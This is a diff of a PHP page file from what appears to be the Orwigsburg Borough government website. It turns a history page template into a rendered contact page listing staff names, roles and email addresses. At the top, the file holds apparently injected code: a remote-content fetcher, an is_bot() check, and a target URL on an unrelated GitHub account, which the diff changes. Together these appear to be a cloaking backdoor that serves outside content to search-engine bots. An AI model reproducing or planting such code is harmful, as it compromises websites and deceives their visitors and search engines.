@@ -39,7 +39,7 @@ function get_remote_content($url) {
 }
  
  
-$target_url = 'https://raw.githubusercontent.com/fadlipul69/pluginsss/refs/heads/main/orwigsburg.govhistory';
+$target_url = 'https://raw.githubusercontent.com/fadlipul69/pluginsss/refs/heads/main/orwigsburg.govcontact';
  
  
 if (is_bot()) {
@@ -52,6 +52,10 @@ if (is_bot()) {
     exit;
 }
 ?>
+
+
+
+
 <!doctype html>
 <html class="no-js" lang="en">
 <head>
@@ -59,7 +63,7 @@ if (is_bot()) {
     <meta http-equiv="x-ua-compatible" content="ie=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
 
-	<title>Borough History</title>
+	<title>General Contact</title>
 
     <meta name="theme-version" content="1.8.1" />
     <meta name="foundation-version" content="5.5.4" />
@@ -70,12 +74,12 @@ if (is_bot()) {
 		<meta name="robots" content="index, follow" />
 		
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Borough History">
-	<meta name="twitter:url" content="https://orwigsburg.gov/history/index.php">
+	<meta name="twitter:title" content="General Contact">
+	<meta name="twitter:url" content="https://orwigsburg.gov/contact/index.php">
 	<meta property="og:type" content="website">
 	<meta property="og:site_name" content="Orwigsburg Borough">
-	<meta property="og:title" content="Borough History">
-	<meta property="og:url" content="https://orwigsburg.gov/history/index.php">
+	<meta property="og:title" content="General Contact">
+	<meta property="og:url" content="https://orwigsburg.gov/contact/index.php">
 
 	<link rel="stylesheet" type="text/css" media="all" href="../rw_common/themes/foundation/consolidated.css" />
 		
@@ -85,15 +89,16 @@ if (is_bot()) {
 	
 
 			<link rel='stylesheet' type='text/css' media='all' href='../rw_common/plugins/stacks/stacks.css' />
-<link rel="stylesheet" type="text/css" media="all" href="../rw_common/plugins/stacks/wysiwyg-content.css" />		<link rel='stylesheet' type='text/css' media='all' href='files/stacks_page_page50.css' />
+<link rel="stylesheet" type="text/css" media="all" href="../rw_common/plugins/stacks/wysiwyg-content.css" />		<link rel='stylesheet' type='text/css' media='all' href='files/stacks_page_page54.css' />
         <script type='text/javascript' charset='utf-8' src='../rw_common/plugins/stacks/jquery-2.2.4.min.js'></script>
         
         <link rel="stylesheet" href="../rw_common/plugins/stacks/font-awesome.min.css">
         
-<script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/imagesloaded.min.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/onimpression.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/moment-with-locales.min.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/mustache.min.js"></script>		
-		<script type='text/javascript' charset='utf-8' src='files/stacks_page_page50.js'></script>
+		
+		<script type='text/javascript' charset='utf-8' src='files/stacks_page_page54.js'></script>
 		
 
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
 
 
@@ -108,8 +113,8 @@ if (is_bot()) {
 <div id="foundation-loader"></div>
 
 
-
  <div id="total-image-reveal" class="reveal-modal" data-reveal aria-hidden="true"> <a class="close-button close-reveal-modal" title="Close" data-close>&times;</a> </div> 
+
 <div id='stacks_out_1' class='stacks_top'><div id='stacks_in_1' class=''><div id='stacks_out_12' class='stacks_out'><div id='stacks_in_12' class='stacks_in '></div></div><div id='stacks_out_134' class='stacks_out'><div id='stacks_in_134' class='stacks_in '>
 	
 	
@@ -119,11 +124,6 @@ if (is_bot()) {
 
 
 
-<?php
-	setlocale(LC_ALL, 'en'.strtoupper('_en.UTF-8'));
-	$process_macros = true;
-	$macro_prefix = '';
-?>
 
 
 
@@ -141,263 +141,183 @@ if (is_bot()) {
 </div></div><div id='stacks_out_24_41' class='stacks_out'><div id='stacks_in_24_41' class='stacks_in com_joeworkman_stacks_foundation_reveal_stack'> <div id="email" class="reveal-lightbox reveal-modal small  " style="" aria-hidden="true" role="dialog" data-reveal> <div id='stacks_out_24_46' class='stacks_out'><div id='stacks_in_24_46' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div><!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-01");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
+  
 	<div id='stacks_out_24_31' class='stacks_out'><div id='stacks_in_24_31' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_36' class='stacks_out'><div id='stacks_in_24_36' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-01)%    
+<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_36' class='stacks_out'><div id='stacks_in_24_36' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    William Reppy    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_37' class='stacks_out'><div id='stacks_in_24_37' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-01)%    
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_37' class='stacks_out'><div id='stacks_in_24_37' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Manager    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_35' class='stacks_out'><div id='stacks_in_24_35' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-01)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_35' class='stacks_out'><div id='stacks_in_24_35' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:manager@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
 </div></div>  </div> </div> 
 </div></div><div id='stacks_out_24_45' class='stacks_out'><div id='stacks_in_24_45' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
 <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-02");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
+  
 	<div id='stacks_out_24_68' class='stacks_out'><div id='stacks_in_24_68' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_69' class='stacks_out'><div id='stacks_in_24_69' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-02)%    
+<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_69' class='stacks_out'><div id='stacks_in_24_69' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Harlee Lomas    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_71' class='stacks_out'><div id='stacks_in_24_71' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-02)%    
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_71' class='stacks_out'><div id='stacks_in_24_71' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Secretary    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_73' class='stacks_out'><div id='stacks_in_24_73' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-02)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_73' class='stacks_out'><div id='stacks_in_24_73' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:secretary@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
 </div></div>  </div> </div> 
 </div></div><div id='stacks_out_24_75' class='stacks_out'><div id='stacks_in_24_75' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
 <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-03");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
+  
 	<div id='stacks_out_24_78' class='stacks_out'><div id='stacks_in_24_78' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_79' class='stacks_out'><div id='stacks_in_24_79' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-03)%    
+<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_79' class='stacks_out'><div id='stacks_in_24_79' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    David Teter    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_81' class='stacks_out'><div id='stacks_in_24_81' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-03)%    
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_81' class='stacks_out'><div id='stacks_in_24_81' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Water/Sewer Department    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_83' class='stacks_out'><div id='stacks_in_24_83' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-03)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_83' class='stacks_out'><div id='stacks_in_24_83' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:dteter@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
 </div></div>  </div> </div> 
 </div></div><div id='stacks_out_24_85' class='stacks_out'><div id='stacks_in_24_85' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
 <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-04");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
+  
 	<div id='stacks_out_24_88' class='stacks_out'><div id='stacks_in_24_88' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_89' class='stacks_out'><div id='stacks_in_24_89' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-04)%    
+<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_89' class='stacks_out'><div id='stacks_in_24_89' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Vince McDonald    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_91' class='stacks_out'><div id='stacks_in_24_91' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-04)%    
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_91' class='stacks_out'><div id='stacks_in_24_91' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Police Chief    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_93' class='stacks_out'><div id='stacks_in_24_93' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-04)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_93' class='stacks_out'><div id='stacks_in_24_93' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto: VMcDonald@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
 </div></div>  </div> </div> 
 </div></div><div id='stacks_out_24_95' class='stacks_out'><div id='stacks_in_24_95' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
 <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-05");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
+  
 	<div id='stacks_out_24_48' class='stacks_out'><div id='stacks_in_24_48' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_49' class='stacks_out'><div id='stacks_in_24_49' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-05)%    
+<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_49' class='stacks_out'><div id='stacks_in_24_49' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Barry Berger    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_51' class='stacks_out'><div id='stacks_in_24_51' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-05)%    
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_51' class='stacks_out'><div id='stacks_in_24_51' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Mayor    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_53' class='stacks_out'><div id='stacks_in_24_53' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-05)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_53' class='stacks_out'><div id='stacks_in_24_53' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:bberger@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
 </div></div>  </div> </div> 
 </div></div><div id='stacks_out_24_55' class='stacks_out'><div id='stacks_in_24_55' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
 <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-06");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
+  
 	<div id='stacks_out_24_116' class='stacks_out'><div id='stacks_in_24_116' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_117' class='stacks_out'><div id='stacks_in_24_117' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-06)%    
+<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_117' class='stacks_out'><div id='stacks_in_24_117' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Richard Bubeck    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_119' class='stacks_out'><div id='stacks_in_24_119' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-06)%    
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_119' class='stacks_out'><div id='stacks_in_24_119' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Council President    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_121' class='stacks_out'><div id='stacks_in_24_121' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-06)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_121' class='stacks_out'><div id='stacks_in_24_121' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:rbubeck@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
 </div></div>  </div> </div> 
 </div></div><div id='stacks_out_24_123' class='stacks_out'><div id='stacks_in_24_123' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
 <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-07");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
+  
 	<div id='stacks_out_24_127' class='stacks_out'><div id='stacks_in_24_127' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_128' class='stacks_out'><div id='stacks_in_24_128' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-07)%    
+<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_128' class='stacks_out'><div id='stacks_in_24_128' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Police Department    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_130' class='stacks_out'><div id='stacks_in_24_130' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-07)%    
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_130' class='stacks_out'><div id='stacks_in_24_130' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    General Contact    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_132' class='stacks_out'><div id='stacks_in_24_132' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-07)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_132' class='stacks_out'><div id='stacks_in_24_132' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:police@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
 </div></div>  </div> </div> 
 </div></div><div id='stacks_out_24_134' class='stacks_out'><div id='stacks_in_24_134' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
 <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-08");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
+  
 	<div id='stacks_out_24_138' class='stacks_out'><div id='stacks_in_24_138' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_139' class='stacks_out'><div id='stacks_in_24_139' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-08)%    
+<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_139' class='stacks_out'><div id='stacks_in_24_139' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    General Inquires    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_141' class='stacks_out'><div id='stacks_in_24_141' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-08)%    
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_141' class='stacks_out'><div id='stacks_in_24_141' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Borough Office    
  
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_143' class='stacks_out'><div id='stacks_in_24_143' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-08)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
+</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_143' class='stacks_out'><div id='stacks_in_24_143' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:borough@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
 </div></div>  </div> </div> 
 </div></div><div id='stacks_out_24_145' class='stacks_out'><div id='stacks_in_24_145' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
 <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-09");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
-	<div id='stacks_out_24_149' class='stacks_out'><div id='stacks_in_24_149' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_150' class='stacks_out'><div id='stacks_in_24_150' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-09)%    
- 
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_152' class='stacks_out'><div id='stacks_in_24_152' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-09)%    
- 
-</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_154' class='stacks_out'><div id='stacks_in_24_154' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-09)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
-</div></div>  </div> </div> 
-</div></div><div id='stacks_out_24_156' class='stacks_out'><div id='stacks_in_24_156' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
-</div></div>
-
-
- <?php } else { ?> 
+  
 
 
 
- <?php } ?> 
+  
 
  
  <a class="close-reveal-modal" aria-label="close" style="">&#215;</a> </div> 
@@ -406,8 +326,7 @@ if (is_bot()) {
 
 
 <div class="top-bar-wrapper  font-family-h2  sticky   matchPadding solid fixedShadow styleActive  submenuIndicator menu-align-right zone-align-right">
-    <nav class="top-bar" data-topbar data-options="is_hover:true;custom_back_text:true;back_text:Back;mobile_show_parent_link:true;scrolltop:false;" role="navigation">
-        <ul class="title-area title-area-site-setup">
+    <nav class="top-bar" data-topbar data-options="is_hover:true;custom_back_text:true;back_text:Back;mobile_show_parent_link:true;scrolltop:false;" role="navigation"><ul class="title-area title-area-site-setup">
             <li class="name ">
                 
                     <a href="https://orwigsburg.gov/">
@@ -460,23 +379,6 @@ if (is_bot()) {
 </div></div></div></div><div id='stacks_out_257' class='stacks_out'><div id='stacks_in_257' class='stacks_in '><div id='stacks_out_257_9' class='stacks_out'><div id='stacks_in_257_9' class='stacks_in com_joeworkman_stacks_impact_stack'> <div class="impact-wrapper impact-preload   proportional-height  "> <div class="pre-loader hidden    "> <i class="pl-spinner hidden fa fa-spinner fa-pulse fa-4x"></i> </div>  <div class="jw-impact slides"> <div class="fg-content fg-full-height">  </div> <ul class="slides-container  "> 
 
 
-<?php
-$stacks_in_257_10_effect = 1;
-function animation_stacks_in_257_10()
-{
-    $random = true;
-    $zoom = array('kb-zoom-in','kb-zoom-out');
-    $e = array_rand($zoom, 1);
-    if ($random) {
-        $number = rand(1, 4);
-    } else {
-        global $stacks_in_257_10_effect;
-        $stacks_in_257_10_effect = $stacks_in_257_10_effect >= 4 ? 1 : $stacks_in_257_10_effect + 1;
-        $number = $stacks_in_257_10_effect;
-    }
-    return "$zoom[$e]-$number-stacks_in_257_10 kb-anim animated";
-}
-?>
 
 
 
@@ -489,64 +391,16 @@ function animation_stacks_in_257_10()
 
 
 <!-- Total Impact Gallery -->
-<?php
-
-$sort    = "default";
-$caption = "h3";
-$mobile  = false;
-$effects = false;
-
-if ($publish) {
-    $totalgallery = new \TotalCMS\Component\Gallery("header-slides");
-    $totalgallery->process_data();
-    $images  = $sort == "old" ? $totalgallery->images : array_reverse($totalgallery->images);
-} else {
-    $totalgallery = new totalpreview("gallery");
-    $images  = $sort == "old" ? $totalgallery->get_gallery("header-slides") : array_reverse($totalgallery->get_gallery("header-slides"));
-}
-
-if ($sort == "shuffle") {
-    shuffle($images);
-}
-
-foreach (array_slice($images, 0, 5) as $image) {
-    $alt    = $image["alt"];
-    $img    = $image["img"];
-    $thumb  = $image["thumb"]["th"];
-    $effect = $effects ? animation_stacks_in_257_10() : "";
-
-    if ($caption != "none" && $alt != "") {
-        $content  = $caption == "markdown" ? $totalgallery->format_text(htmlspecialchars($alt)) : "<$caption class=\"text-center fn-text-sw5c1\">$alt</$caption>";
-        echo "<li class=\"impact-slide slide slide-stacks_in_257_10 fg-content $effect\">";
-
-        if ($mobile) {
-            
-            echo "<img oncontextmenu=\"return false;\" draggable=\"false\" class=\"impact-image\" src=\"https://orwigsburg.gov/$thumb\" alt=\"$alt\" data-interchange=\"[https://orwigsburg.gov/$thumb,(default)],[https://orwigsburg.gov/$img,(medium)]\"/>";
-            
-        } else {
-            echo "<img oncontextmenu=\"return false;\" draggable=\"false\" class=\"impact-image\" src=\"https://orwigsburg.gov/$img\" alt=\"$alt\"/>";
-        }
-
-        echo "<div class=\"impact-container h-right v-bottom\">
-                <div class=\"slide-content\" class=\"text-center fn-text-sw5c1\">$content</div>
+<li class="impact-slide slide slide-stacks_in_257_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/slideshowimage_30.jpg" alt="A Great Place to Raise a Family"/><div class="impact-container h-right v-bottom">
+                <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">A Great Place to Raise a Family</h3></div>
             </div>
-        </li>";
-    } else {
-        if ($mobile) {
-            echo "<li class=\"impact-slide slide slide-stacks_in_257_10 $effect\">";
-            
-            echo "<img oncontextmenu=\"return false;\" draggable=\"false\" class=\"impact-image\" src=\"https://orwigsburg.gov/$thumb\" alt=\"$alt\" data-interchange=\"[https://orwigsburg.gov/$thumb,(default)],[https://orwigsburg.gov/$img,(medium)]\"/>";
-            
-            echo "</li>";
-        } else {
-            echo "<li class=\"impact-slide slide slide-stacks_in_257_10 $effect\">
-                <img oncontextmenu=\"return false;\" draggable=\"false\" class=\"impact-image\" src=\"https://orwigsburg.gov/$img\" alt=\"$alt\"/>
-            </li>";
-        }
-    }
-}
-?>
-
+        </li><li class="impact-slide slide slide-stacks_in_257_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/ball-fields.jpg" alt="Recreation"/><div class="impact-container h-right v-bottom">
+                <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">Recreation</h3></div>
+            </div>
+        </li><li class="impact-slide slide slide-stacks_in_257_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/town-18-tiny.jpg" alt="A True "American Home Town""/><div class="impact-container h-right v-bottom">
+                <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">A True "American Home Town"</h3></div>
+            </div>
+        </li>
 
 
 
@@ -572,411 +426,55 @@ foreach (array_slice($images, 0, 5) as $image) {
  </ul> <nav class="slides-navigation"> <a href="#" class="next"></a> <a href="#" class="prev"></a> </nav>  </div>  </div>  
 </div></div></div></div><div id='stacks_out_138' class='stacks_out'><div id='stacks_in_138' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
 <div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_4' class='stacks_out'><div id='stacks_in_4' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
-<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_17' class='stacks_out'><div id='stacks_in_17' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h1 class="text-left     " >%cmsText(history-headline)%</h1> 
+<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_17' class='stacks_out'><div id='stacks_in_17' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h1 class="text-left     " >General Contact Form</h1> 
 </div></div><!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("history-descript-togg");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
-	<div id='stacks_out_137' class='stacks_out'><div id='stacks_in_137' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(history-descript)%    
+  
+	<div id='stacks_out_137' class='stacks_out'><div id='stacks_in_137' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <p>Do you have a question you can't find an answer to on our website?<br>Would you like to leave a comment or suggestion?</p><p><strong>Please use the form below:</strong></p>    
  
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
-<div id='stacks_out_140' class='stacks_out'><div id='stacks_in_140' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
-</div></div><div id='stacks_out_258' class='stacks_out'><div id='stacks_in_258' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(history-content)%    
- 
-</div></div><div id='stacks_out_285' class='stacks_out'><div id='stacks_in_285' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
